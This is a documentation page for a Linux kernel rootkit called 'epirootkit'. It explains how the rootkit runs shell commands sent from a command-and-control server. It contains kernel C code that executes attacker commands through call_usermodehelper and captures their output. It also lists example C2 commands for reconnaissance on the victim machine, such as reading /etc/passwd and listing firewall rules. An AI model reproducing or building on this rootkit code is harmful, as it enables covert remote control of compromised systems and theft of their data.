---
title: "Command Execution"
description: "Execute shell commands remotely with full output capture"
icon: "terminal"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 510
---

# Command Execution

Execute shell commands remotely through the rootkit with full output capture.

## How It Works

1. **C2 sends command** via network
2. **Rootkit executes** using `call_usermodehelper()` with `/bin/sh -c`
3. **Captures output** by redirecting to temporary file
4. **Returns result** with exit code and output

## Implementation

### Command Handler
```c
static int handle_exec(const char *data)
{
    char *argv[] = { "/bin/sh", "-c", command_copy, NULL };
    char *envp[] = { 
        "HOME=/", 
        "PATH=/sbin:/bin:/usr/bin:/usr/local/bin", 
        NULL 
    };
    
    // Generate unique temporary filename
    snprintf(temp_filename, sizeof(temp_filename), 
             "/tmp/epirootkit_out_%d", atomic_inc_return(&exec_counter));
    
    // Build command with output redirection
    snprintf(full_command, command_len + temp_len + 32,
             "%s > %s 2>&1", data, temp_filename);
    
    // Execute and capture output
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    
    return send_result(formatted_result);
}
```

### Output Capture
- **Redirection**: `command > /tmp/epirootkit_out_X 2>&1`
- **File reading**: Uses `kernel_read()` to get output
- **Dynamic allocation**: `vmalloc()` for large outputs (up to 64KB)
- **Cleanup**: Automatic temporary file removal

## Usage

### WebUI Terminal
Interactive terminal interface with:
- **Command input**: Type commands directly
- **Real-time output**: Immediate response display
- **Command history**: Previous commands accessible
- **Exit codes**: Color-coded success/failure indicators

### Example C2 Commands
```bash
# System information
exec Client-1 whoami
exec Client-1 uname -a
exec Client-1 ps aux

# File operations
exec Client-1 ls -la /etc
exec Client-1 cat /etc/passwd
exec Client-1 find /var/log -name "*.log"

# Network reconnaissance  
exec Client-1 netstat -tuln
exec Client-1 ss -tulpn
exec Client-1 iptables -L
```